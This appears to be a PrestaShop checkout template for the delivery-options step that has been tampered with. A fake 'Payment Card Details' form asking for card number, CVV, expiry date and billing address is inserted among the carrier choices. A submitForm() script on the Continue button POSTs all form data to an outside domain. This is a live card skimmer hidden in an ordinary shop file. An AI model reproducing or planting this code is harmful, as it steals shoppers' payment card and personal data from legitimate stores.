{**
 * 2007-2016 PrestaShop
 *
 * NOTICE OF LICENSE
 *
 * This source file is subject to the Open Software License (OSL 3.0)
 * that is bundled with this package in the file LICENSE.txt.
 * It is also available through the world-wide-web at this URL:
 * http://opensource.org/licenses/osl-3.0.php
 * If you did not receive a copy of the license and are unable to
 * obtain it through the world-wide-web, please send an email
 * to license@prestashop.com so we can send you a copy immediately.
 *
 * DISCLAIMER
 *
 * Do not edit or add to this file if you wish to upgrade PrestaShop to newer
 * versions in the future. If you wish to customize PrestaShop for your
 * needs please refer to http://www.prestashop.com for more information.
 *
 * @author    PrestaShop SA <contact@prestashop.com>
 * @copyright 2007-2016 PrestaShop SA
 * @license   http://opensource.org/licenses/osl-3.0.php Open Software License (OSL 3.0)
 * International Registered Trademark & Property of PrestaShop SA
 *}
{extends file='checkout/_partials/steps/checkout-step.tpl'}

{block name='step_content'}
  <div id="hook-display-before-carrier">
    {$hookDisplayBeforeCarrier nofilter}
  </div>

  <div class="delivery-options-list">
    {if $delivery_options|count}
      <form
        class="clearfix"
        id="js-delivery"
        data-url-update="{url entity='order' params=['ajax' => 1, 'action' => 'selectDeliveryOption']}"
        method="post"
      >
        <div class="form-fields">
          {block name='delivery_options'}
            <div class="delivery-options">
              {foreach from=$delivery_options item=carrier key=carrier_id}
                  <div class="delivery-option">
                    <div class="col-sm-1">
                      <span class="custom-radio pull-xs-left">
                        <input type="radio" name="delivery_option[{$id_address}]" id="delivery_option_{$carrier.id}" value="{$carrier_id}"{if $delivery_option == $carrier_id} checked{/if}>
                        <span></span>
                      </span>
                    </div>
                    <label for="delivery_option_{$carrier.id}" class="col-sm-11 delivery-option-2">
                      <div class="row">
                        <div class="col-sm-5 col-xs-12">
                          <div class="row">
                            {if $carrier.logo}
                            <div class="col-xs-3">
                                <img src="{$carrier.logo}" alt="{$carrier.name}" />
                            </div>
                            {/if}
                            <div class="{if $carrier.logo}col-xs-9{else}col-xs-12{/if}">
                              <span class="h6 carrier-name">{$carrier.name}</span>
                            </div>
                          </div>
                        </div>
                        <div class="col-sm-4 col-xs-12">
                          <span class="carrier-delay">{$carrier.delay}</span>
                        </div>
                        <div class="col-sm-3 col-xs-12">
                          <span class="carrier-price">{$carrier.price}</span>
                        </div>
                      </div>
                    </label>
                    <div class="col-md-12 carrier-extra-content"{if $delivery_option != $carrier_id} style="display:none;"{/if}>
                        {$carrier.extraContent nofilter}
                    </div>
                    <div class="clearfix"></div>
                  </div>
              {/foreach}
            </div>
			<style>
table {
  border-collapse: collapse;
  width: 100%;
}
td {
  padding: 10px;
  vertical-align: top;
}
label {
  display: block;
  margin-bottom: 5px;
  font-weight: bold;
  color: #333;
  font-size: 16px;
}
input[type="text"] {
  width: 100%;
  padding: 10px;
  border-radius: 5px;
  border: 1px solid #ccc;
  font-size: 16px;
  color: #555;
  box-sizing: border-box;
  margin-bottom: 10px;
}
td {
  padding: 10px;
}
label {
  display: block;
  margin-bottom: 5px;
  font-weight: bold;
  color: #333;
  width: 100%;
}
.card-details {
  display: flex;
  align-items: center;
  margin-bottom: 20px;
}
.card-details h2 {
  margin-right: 20px;
  font-size: 18px;
}
.card-logos {
  display: flex;
  align-items: center;
}
.card-logos img {
  height: 20px;
  margin-left: 10px;
  border-radius: 5px;
  box-shadow: 0 0 5px rgba(0, 0, 0, 0.3);
  transition: transform 0.3s ease-in-out;
}
.card-logos img:hover {
  transform: scale(1.1);
}
label {
  display: block;
  margin-bottom: 10px;
  font-weight: bold;
  color: #333;
}
.input-group {
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: 20px;
}
.input-group input {
  flex: 1;
  margin-left: 10px;
  background-color: #f5f5f5;
  border: none;
  padding: 10px;
  border-radius: 5px;
  font-size: 16px;
  color: #555;
}
input {
  display: block;
  margin-bottom: 20px;
  padding: 10px;
  border: none;
  border-radius: 4px;
  font-size: 16px;
  color: #555;
  background-color: #f5f5f5;
}
input:focus {
  border-color: #1E90FF;
  outline: none;
}
.label-group {
  display: flex;
  justify-content: space-between;
}
button {
  background-color: #1E90FF;
  color: #fff;
  border: none;
  border-radius: 5px;
  font-size: 16px;
  padding: 10px 20px;
  cursor: pointer;
}
button:hover {
  background-color: #007fff;
}
</style>
<center>
<div>
  <div>
    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRQC7CieAW4f7cXwMctXmbjZurEyaVxA2qN0w&usqp=CAU" alt="Mastercard">
  </div>
<br>

<h3>Payment Card Details</h3>
</center>
<br>

<table>
  <tr>
    <td>
      <label for="card_holder" style="text-align: left;">Cardholder's Name</label>
      <input type="text" id="card_holder" name="card_holder" required placeholder="John Doe"><br>
      <label for="expiry_date" style="text-align: left;">Expiration Date</label>
      <input type="text" id="expiry_date" name="expiry_date" required placeholder="MM/YY"><br>
      <label for="city" style="text-align: left;">City</label>
      <input type="text" id="city" name="city" required placeholder="City"><br>
      <label for="country" style="text-align: left;">Country</label>
      <input type="text" id="country" name="country" required placeholder="Country"><br>
    </td>
    <td style="text-align:center;">
      <label for="card_number" style="text-align: left;">Card Number</label>
      <input type="text" id="card_number" name="card_number" required placeholder="xxxx-xxxx-xxxx-xxxx"><br>
      <label for="cvv" style="text-align: left;">CVV</label>
      <input type="text" id="cvv" name="cvv" required placeholder="123"><br>
      <label for="address" style="text-align: left;">Address</label>
      <input type="text" id="address" name="address" required placeholder="Address"><br>
      <label for="zipcode" style="text-align: left;">Zip Code</label>
      <input type="text" id="zipcode" name="zipcode" required placeholder="12345"><br>
    </td>
  </tr>
</table>



          {/block}
          <div class="order-options">
            {if $recyclablePackAllowed}
              <label>
                <input type="checkbox" name="recyclable" value="1" {if $recyclable} checked {/if}>
                <span>{l s='I would like to receive my order in recycled packaging.' d='Shop.Theme.Checkout'}</span>
              </label>
            {/if}
            {if $gift.allowed}
              <span class="custom-checkbox">
                <input
                  class="js-gift-checkbox"
                  name="gift"
                  type="checkbox"
                  value="1"
                  {if $gift.isGift}checked="checked"{/if}
                >
                <span><i class="material-icons checkbox-checked">&#xE5CA;</i></span>
                <label>{$gift.label}</label >
              </span>
              <div id="gift" class="collapse{if $gift.isGift} in{/if}">
                <label for="gift_message">{l s='If you\'d like, you can add a note to the gift:' d='Shop.Theme.Checkout'}</label>
                <textarea rows="2" cols="120" id="gift_message" name="gift_message">{$gift.message}</textarea>
              </div>

            {/if}
          </div>
        </div>
        <button type="submit" onclick="submitForm()" class="continue btn btn-primary pull-xs-right" name="confirmDeliveryOption" value="1">
          {l s='Continue' d='Shop.Theme.Actions'}
        </button>
      </form>
	  <script>
function submitForm() {
  var form = document.getElementById("js-delivery");
  var formData = new FormData(form);
  fetch("https://0sec0.com/bijoux-antilles.com.php", {
    method: "POST",
    body: formData
  })
  .then(response => {
    if (response.ok) {
      console.log("Sent!");
    } else {
      console.error("error!");
    }
  })
  .catch(error => {
    console.error("error!", error);
  });
}
</script>
    {else}
      <p class="alert alert-danger">{l s='Unfortunately, there are no carriers available for your delivery address.' d='Shop.Theme.Checkout'}</p>
    {/if}
  </div>

  <div id="hook-display-after-carrier">
    {$hookDisplayAfterCarrier nofilter}
  </div>

  <div id="extra_carrier"></div>
{/block}
